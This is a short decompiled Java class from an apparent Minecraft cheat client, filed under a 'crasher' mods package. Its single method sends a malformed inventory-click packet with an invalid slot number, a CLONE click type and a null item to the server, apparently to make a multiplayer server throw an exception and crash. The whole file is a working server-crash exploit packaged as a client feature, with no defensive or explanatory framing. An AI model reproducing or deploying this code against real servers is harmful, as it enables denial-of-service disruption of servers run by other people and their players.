// 
// Decompiled by Procyon v0.6.0
// 

package me.amkgre.bettercraft.client.mods.crasher;

import net.minecraft.network.Packet;
import net.minecraft.item.ItemStack;
import net.minecraft.network.play.client.CPacketClickWindow;
import net.minecraft.inventory.ClickType;
import net.minecraft.client.Minecraft;

public class ExceptionerCrasher
{
    public static void start() {
        final Minecraft mc = Minecraft.getMinecraft();
        Minecraft.getMinecraft().player.connection.sendPacket(new CPacketClickWindow(0, -2, 0, ClickType.CLONE, null, (short)1));
    }
}
